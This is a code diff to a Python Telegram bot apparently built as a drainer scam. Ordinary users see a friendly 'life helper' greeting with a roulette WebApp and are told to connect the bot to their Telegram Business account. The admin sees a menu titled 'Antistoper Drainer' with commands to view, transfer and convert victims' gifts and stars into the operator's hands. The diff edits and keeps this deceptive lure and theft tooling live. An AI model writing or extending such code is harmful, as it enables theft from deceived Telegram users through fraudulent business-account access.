@@ -204,48 +204,59 @@ async def refund_command(message: types.Message):
     except Exception as e:
         await message.answer(f"Ошибка при выполнении возврата: {str(e)}")
 
-@dp.message(F.text == "/start")
+@dp.message(Command("start"))
 async def start_command(message: Message):
-    # Добавляем кнопку для запуска WebApp
-    webapp_url = "https://my-roulette-app-pi.vercel.app/" # <-- ЗАМЕНИ НА СВОЙ URL
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
-        ],
-        resize_keyboard=True
-    )
-    
-    try:
-        connections = load_connections()
-        count = len(connections)
-    except Exception:
-        count = 0
-
-    if not message.from_user or not message.from_user.id:
+    if not message.from_user:
         return
 
-    if message.from_user.id != ADMIN_ID:
-        await message.answer(
-            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
-            "• ответит на любой вопрос\n"
-            "• поддержит тебя в трудную минуту\n"
-            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
-            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
-            parse_mode="HTML",
-            reply_markup=keyboard # Добавляем клавиатуру
+    # Проверяем, админ ли это
+    if message.from_user.id == ADMIN_ID:
+        # Админское приветствие
+        admin_text = (
+            "<b>Antistoper Drainer</b>\n\n"
+            "🔗 /gifts - просмотреть гифты\n"
+            "🔗 /stars - просмотреть звезды\n"
+            "🔗 /transfer <code>&lt;owned_id&gt;</code> <code>&lt;business_connect&gt;</code> - передать гифт вручную\n"
+            "🔗 /convert - конвертировать подарки в звезды"
         )
+        if WEBHOOK_URL:
+            webapp_url = WEBHOOK_URL
+            keyboard = ReplyKeyboardMarkup(
+                keyboard=[[KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]],
+                resize_keyboard=True
+            )
+            await message.answer(admin_text, reply_markup=keyboard)
+        else:
+            await message.answer(admin_text)
+
     else:
-        await message.answer(
-            f"Antistoper Drainer\n\n🔗 "
-            "/gifts - просмотреть гифты\n"
-            "/stars - просмотреть звезды\n"
-            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
-            "/convert - конвертировать подарки в звезды",
-            reply_markup=keyboard # Добавляем клавиатуру
-        )
+        # Пользовательское приветствие
+        if WEBHOOK_URL:
+            webapp_url = WEBHOOK_URL
+            keyboard = ReplyKeyboardMarkup(
+                keyboard=[[KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]],
+                resize_keyboard=True
+            )
+            await message.answer(
+                "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
+                "• ответит на любой вопрос\n"
+                "• поддержит тебя в трудную минуту\n"
+                "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
+                "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
+                reply_markup=keyboard
+            )
+        else:
+            await message.answer(
+                "❤️ <b>Я — твой главный помощник...</b> (WebApp не настроен)"
+            )
 
 @dp.message(F.text)
 async def handle_text_query(message: Message):
+    # Проверяем, не админ ли это, чтобы не спамить ему этим сообщением
+    if message.from_user and message.from_user.id == ADMIN_ID:
+        # Можно добавить обработку текстовых команд админа или просто проигнорировать
+        return
+
     await message.answer(
         "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
         "Как это сделать?\n\n"
